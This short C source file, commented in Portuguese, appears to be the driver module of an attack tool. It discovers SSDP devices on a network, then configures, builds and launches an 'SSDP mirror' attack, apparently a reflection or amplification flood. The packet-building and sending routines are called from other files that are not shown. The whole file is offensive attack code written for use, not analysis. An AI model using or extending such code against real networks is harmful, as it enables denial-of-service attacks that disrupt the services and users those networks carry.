

#include "venus.h"
#include "ssdpLib.h"
#include "listssdp.h"


void createAttackSSDP(LhfDraft *draft){
    

    listDispositivoSSDP* listaDispositivos;
	configuracaoAtaque* configuracao = NULL;
	pacoteAtaque* pckAttack = NULL;

    listaDispositivos = iniciaListDisp();

    printf("Modulo de pesquisa SSDP. \n");
	printf("------------------------------------------------\n");
    pesquisarDispositivosSSDP(listaDispositivos);
	printf("----------------------Fim Pesquisa-------------------\n");
	//mostrarDispositivosObtidos(listaDispositivos);

	/*----------------------------------------------------------------------*/
	printf("Modulo de ataque SSDP. \n");

	configuracao = configurarAttackSSDP(listaDispositivos);

	pckAttack = montaPacketAttackSSDP(configuracao);

	iniciaAtaqueSSDP(configuracao, pckAttack, 1);

}


// p_draft = argumentos que o ataque vai precisar.
int  ExecuteSsdpMirror( void *p_draft )
{
    createAttackSSDP(p_draft);

    return 0;
}
